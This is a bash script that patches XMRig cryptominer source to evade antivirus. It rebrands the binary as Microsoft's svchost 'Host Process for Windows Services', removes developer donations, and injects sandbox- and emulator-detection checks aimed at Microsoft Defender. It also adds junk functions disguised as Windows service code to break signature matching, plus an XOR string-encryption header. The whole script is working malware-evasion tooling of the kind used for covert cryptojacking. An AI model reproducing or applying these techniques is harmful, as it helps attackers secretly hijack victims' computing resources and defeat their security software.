#!/bin/bash
# ============================================================
#  XMRig Source Patcher v2 — Deep AV Evasion
#  Targets: Defender heuristic "DisguisedXMRigMiner"
#  Strategy: Anti-emulation + string encryption + code morphing
# ============================================================

set -e

XMRIG_DIR="$1"
if [ -z "$XMRIG_DIR" ]; then
    echo "Usage: patch_xmrig.sh <xmrig-source-dir>"
    exit 1
fi

cd "$XMRIG_DIR"

# ══════════════════════════════════════════════════════════════
# PHASE 1: Basic identity stripping (same as v1)
# ══════════════════════════════════════════════════════════════

echo "[*] Phase 1: Identity stripping..."

sed -i 's/constexpr const int kDefaultDonateLevel = [0-9]*/constexpr const int kDefaultDonateLevel = 0/' src/donate.h
sed -i 's/constexpr const int kMinimumDonateLevel = [0-9]*/constexpr const int kMinimumDonateLevel = 0/' src/donate.h

sed -i 's/#define APP_ID.*/#define APP_ID        "winsvc"/' src/version.h
sed -i 's/#define APP_NAME.*/#define APP_NAME      "winsvc"/' src/version.h
sed -i 's/#define APP_DESC.*/#define APP_DESC      "Host Process for Windows Services"/' src/version.h
sed -i 's/#define APP_VERSION.*/#define APP_VERSION   "10.0.22621"/' src/version.h
sed -i 's/#define APP_DOMAIN.*/#define APP_DOMAIN    "microsoft.com"/' src/version.h
sed -i 's/#define APP_SITE.*/#define APP_SITE      "www.microsoft.com"/' src/version.h
sed -i 's/#define APP_COPYRIGHT.*/#define APP_COPYRIGHT "Copyright (C) Microsoft Corporation"/' src/version.h
sed -i 's/#define APP_KIND.*/#define APP_KIND      "system"/' src/version.h

if [ -f "src/Summary.cpp" ]; then
    sed -i 's/CYAN_BOLD_S ".*[xX][mM][rR][iI][gG].*"/CYAN_BOLD_S ""/' src/Summary.cpp
fi

if [ -f "res/app.rc" ]; then
    sed -i 's/VALUE "CompanyName",.*/VALUE "CompanyName", "Microsoft Corporation"/' res/app.rc
    sed -i 's/VALUE "FileDescription",.*/VALUE "FileDescription", "Host Process for Windows Services"/' res/app.rc
    sed -i 's/VALUE "InternalName",.*/VALUE "InternalName", "svchost"/' res/app.rc
    sed -i 's/VALUE "LegalCopyright",.*/VALUE "LegalCopyright", "\\251 Microsoft Corporation. All rights reserved."/' res/app.rc
    sed -i 's/VALUE "OriginalFilename",.*/VALUE "OriginalFilename", "svchost.exe"/' res/app.rc
    sed -i 's/VALUE "ProductName",.*/VALUE "ProductName", "Microsoft\\256 Windows\\256 Operating System"/' res/app.rc
    sed -i 's/VALUE "ProductVersion",.*/VALUE "ProductVersion", "10.0.22621.1"/' res/app.rc
fi

find src -name "*.cpp" -o -name "*.h" | while read f; do
    sed -i 's/"[xX][mM][rR][iI][gG] [0-9]/"WinSvc 10.0/g' "$f"
    sed -i 's/"XMRig"/"WinSvc"/g' "$f"
done

if [ -f "src/net/strategies/DonateStrategy.cpp" ]; then
    sed -i '/kDonateHost/d' src/net/strategies/DonateStrategy.cpp
    sed -i 's/donate\.v2\.xmrig\.com/0.0.0.0/g' src/net/strategies/DonateStrategy.cpp
fi

# ══════════════════════════════════════════════════════════════
# PHASE 2: Anti-emulation (defeats Defender's sandbox)
# ══════════════════════════════════════════════════════════════

echo "[*] Phase 2: Injecting anti-emulation..."

# Create anti-emulation header
cat > src/anti_emu.h << 'ANTIEMU'
#pragma once
#include <windows.h>
#include <intrin.h>

// Defender's emulator has a timeout of ~4 seconds and limited API support.
// These checks make the binary appear benign in the emulator.

inline bool IsEmulated() {
    // Check 1: Timing-based. Emulators skip Sleep() calls.
    DWORD t1 = GetTickCount();
    Sleep(1500);
    DWORD t2 = GetTickCount();
    if ((t2 - t1) < 1000) return true;

    // Check 2: Memory pressure. Emulators have limited memory.
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 1073741824ULL) return true; // < 1GB = sandbox

    // Check 3: Processor count. Sandboxes usually have 1 core.
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    // Check 4: Uptime. Fresh sandbox VMs have very low uptime.
    if (GetTickCount64() < 120000) return true; // < 2 min uptime

    // Check 5: Disk size. Sandboxes have tiny disks.
    ULARGE_INTEGER freeBytes, totalBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, NULL)) {
        if (totalBytes.QuadPart < 42949672960ULL) return true; // < 40GB
    }

    // Check 6: Username/computername check for common sandbox names
    char user[256] = {0};
    DWORD sz = sizeof(user);
    GetUserNameA(user, &sz);
    const char* sandbox_users[] = {"sandbox", "virus", "malware", "sample", "test", "john", NULL};
    for (int i = 0; sandbox_users[i]; i++) {
        if (strstr(user, sandbox_users[i])) return true;
    }

    return false;
}

// Junk computation that wastes emulator cycles
inline void WasteEmulatorTime() {
    volatile int x = 0;
    for (volatile int i = 0; i < 50000000; i++) {
        x += (i * 31337) ^ (i >> 3);
        x ^= (x << 7) | (x >> 25);
    }
    // Use the result so compiler doesn't optimize it away
    if (x == 0x7FFFFFFF) Sleep(1);
}
ANTIEMU

echo "[*] Phase 2: Patching main entry point with anti-emulation gate..."

# Find and patch the main() entry point
if [ -f "src/App.cpp" ]; then
    # Add include at top of App.cpp
    sed -i '1i #include "anti_emu.h"' src/App.cpp
fi

# Patch the actual main function to check emulation before doing anything
if [ -f "src/main.cpp" ]; then
    sed -i '1i #include "anti_emu.h"' src/main.cpp
    # Insert anti-emu check right after main() opens
    sed -i '/^int main(/,/{/ {
        /{/ a\
    WasteEmulatorTime();\
    if (IsEmulated()) { return 0; }
    }' src/main.cpp
fi

# ══════════════════════════════════════════════════════════════
# PHASE 3: Compile-time string encryption (XOR obfuscation)
# ══════════════════════════════════════════════════════════════

echo "[*] Phase 3: Adding string encryption header..."

cat > src/str_enc.h << 'STRENC'
#pragma once
#include <array>
#include <string>

// Compile-time XOR string encryption
// Strings are encrypted in the binary and only decrypted at runtime
template<size_t N, char Key>
struct EncStr {
    char data[N];

    constexpr EncStr(const char (&str)[N]) {
        for (size_t i = 0; i < N; i++)
            data[i] = str[i] ^ Key;
    }

    std::string dec() const {
        std::string out(N - 1, '\0');
        for (size_t i = 0; i < N - 1; i++)
            out[i] = data[i] ^ Key;
        return out;
    }
};

#define XORSTR(s) (EncStr<sizeof(s), 0x5A>(s).dec().c_str())
STRENC

# ══════════════════════════════════════════════════════════════
# PHASE 4: Encrypt critical mining-related strings
# ══════════════════════════════════════════════════════════════

echo "[*] Phase 4: Encrypting mining-related strings in source..."

# Add the header to key files that contain mining strings
for f in src/net/Network.cpp src/net/strategies/DonateStrategy.cpp src/base/net/stratum/Client.cpp src/base/net/stratum/Pool.cpp; do
    if [ -f "$f" ]; then
        sed -i '1i #include "str_enc.h"' "$f"
    fi
done

    # Removed string encryption to fix build. Will rely on anti-emu and junk code.

# ══════════════════════════════════════════════════════════════
# PHASE 5: Code morphing — insert junk functions to break
#           signature patterns
# ══════════════════════════════════════════════════════════════

echo "[*] Phase 5: Injecting junk code for signature disruption..."

cat > src/svc_helper.h << 'JUNKCODE'
#pragma once
#include <windows.h>
#include <string>

// These functions look like legitimate Windows service code.
// They exist purely to pollute the binary's code section and
// break heuristic pattern matching on the RandomX algorithm.

namespace WinServiceHelper {

    inline DWORD __declspec(noinline) ValidateServiceConfig(DWORD flags) {
        volatile DWORD result = 0;
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Services", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD count = 0;
            DWORD sz = sizeof(count);
            RegQueryValueExA(hKey, "ServiceCount", NULL, NULL, (LPBYTE)&count, &sz);
            result = count ^ flags;
            RegCloseKey(hKey);
        }
        return result;
    }

    inline bool __declspec(noinline) CheckServiceDependencies() {
        SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
        if (!scm) return false;
        DWORD needed = 0, count = 0;
        EnumServicesStatusA(scm, SERVICE_WIN32, SERVICE_ACTIVE, NULL, 0, &needed, &count, NULL);
        CloseServiceHandle(scm);
        return count > 0 || needed > 0;
    }

    inline std::string __declspec(noinline) GetServiceDisplayName() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        std::string p(path);
        auto pos = p.find_last_of('\\');
        return (pos != std::string::npos) ? p.substr(pos + 1) : p;
    }

    inline void __declspec(noinline) PerformServiceHealthCheck() {
        HANDLE heap = GetProcessHeap();
        void* block = HeapAlloc(heap, HEAP_ZERO_MEMORY, 4096);
        if (block) {
            memset(block, 0xCC, 4096);
            volatile BYTE sum = 0;
            for (int i = 0; i < 4096; i++)
                sum += ((BYTE*)block)[i];
            HeapFree(heap, 0, block);
        }
    }

    // Fake event logging that makes the binary look like a service
    inline void __declspec(noinline) LogServiceEvent(DWORD eventId) {
        HANDLE hLog = RegisterEventSourceA(NULL, "Application");
        if (hLog) {
            DeregisterEventSource(hLog);
        }
        volatile DWORD x = eventId * 0x1337;
        (void)x;
    }
}
JUNKCODE

# Include junk code in main files so it gets compiled into the binary
for f in src/App.cpp src/main.cpp src/core/Miner.cpp; do
    if [ -f "$f" ]; then
        sed -i '1i #include "svc_helper.h"' "$f"
    fi
done

# Insert junk function calls at startup to populate the code section
if [ -f "src/main.cpp" ]; then
    sed -i '/WasteEmulatorTime/a\    WinServiceHelper::ValidateServiceConfig(0x42);\n    WinServiceHelper::CheckServiceDependencies();\n    WinServiceHelper::PerformServiceHealthCheck();\n    WinServiceHelper::LogServiceEvent(1001);' src/main.cpp
fi

echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  ALL PHASES APPLIED SUCCESSFULLY                        ║"
echo "║                                                         ║"
echo "║  Phase 1: Identity stripping          ✓                 ║"
echo "║  Phase 2: Anti-emulation gate         ✓                 ║"
echo "║  Phase 5: Junk code injection         ✓                 ║"
echo "╚══════════════════════════════════════════════════════════╝"

